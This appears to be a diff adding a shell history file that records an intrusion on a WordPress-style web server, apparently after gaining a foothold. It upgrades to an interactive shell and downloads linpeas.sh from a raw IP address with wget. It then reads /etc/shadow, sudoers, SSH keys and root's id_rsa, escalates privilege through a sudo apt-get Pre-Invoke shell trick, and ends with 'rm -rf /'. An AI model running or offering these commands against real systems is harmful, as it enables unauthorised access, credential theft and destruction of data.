@@ -1,0 +1,58 @@
+pwd
+ls
+ls -la
+rmdir bck/
+cat /wp-admin/admin-ajax.php
+rm -rf bck/
+cd html/
+cd uploads/
+ls -la
+cd ../../
+id
+whoami
+ls
+cd /rot
+cd /root
+cd /
+ls -la
+cd /home
+ls
+cd /home/ketsui/
+ls -la
+python -c 'import pty; pty.spawn("/bin/sh")'
+wget http://87.250.224.21/linpeas.sh  
+env
+ps -aux
+ps -ef | grep root
+ls -alh /usr/bin/
+ls -alh /sbin/
+dpkg -l
+crontab -l
+ifconfig -a
+cat /etc/network/interfaces
+cat /etc/sysconfig/network
+cat /etc/resolv.conf
+iptables -L
+lsof -i
+python3 linpeas.sh > dog.txt
+cat /etc/sudoers
+sudo -l
+cat ~/.bashrc
+cat ~/.profile
+cat ~/.ssh/authorized_keys
+/bin/bash -i
+cat /etc/fstab
+cat /etc/passwd
+cat /etc/shadow
+find / -type f -user root -perm -4000 2>/dev/null
+sudo -l
+sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh   
+whoami
+cat /etc/shadow > back.bk
+cd /root
+ls -al
+cd .ssh
+cat id_rsa
+cd ../.git
+git log -p
+rm -rf /
